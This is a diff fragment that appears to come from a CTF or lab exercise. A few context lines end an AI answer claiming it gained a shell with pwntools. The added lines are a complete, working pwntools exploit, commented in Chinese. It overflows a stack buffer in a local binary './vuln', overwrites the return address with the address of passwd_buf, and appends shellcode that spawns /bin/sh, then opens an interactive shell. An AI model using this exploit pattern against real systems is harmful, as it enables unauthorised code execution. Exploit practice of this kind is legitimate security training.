@@ -141,3 +141,54 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll exploit the bu
  '\n'
  "This indicates that we've successfully gained a shell and exploited the "
  'vulnerability using pwntools.')
+
+from pwn import *
+
+# 设置目标架构的上下文
+context.update(arch='i386', os='linux')
+
+# 替换为实际的二进制文件名
+binary = './vuln'
+
+# 加载二进制文件
+elf = ELF(binary)
+
+# 启动进程
+p = process(binary)
+
+# `passwd_buf`的地址（从反编译代码中获取）
+# 根据实际情况调整此地址
+passwd_buf_addr = elf.symbols['passwd_buf']
+
+# 生成无空字节的shellcode以执行`execve('/bin/sh', NULL, NULL)`
+shellcode = asm(shellcraft.sh())
+
+# 确保shellcode中不包含空字节
+assert b'\x00' not in shellcode, "Shellcode contains null bytes!"
+
+# 计算返回地址的偏移量
+offset = 0x3b + 4  # 缓冲区大小 (0x3b) + 保存的EBP (4字节)
+
+# 构造有效载荷
+payload = b''
+
+# 步骤1：前8个字节以通过长度检查（非空字节）
+payload += b'A' * 8
+
+# 步骤2：填充至返回地址
+padding_length = offset - len(payload)
+payload += b'B' * padding_length
+
+# 步骤3：覆盖返回地址为`passwd_buf`的地址
+payload += p32(passwd_buf_addr)
+
+# 步骤4：附加shellcode
+payload += shellcode
+
+# 发送有效载荷给程序
+print(p.recvuntil(b"Plz input your passwd:\\n"))
+
+p.sendline(payload)
+
+# 与shell交互
+p.interactive()
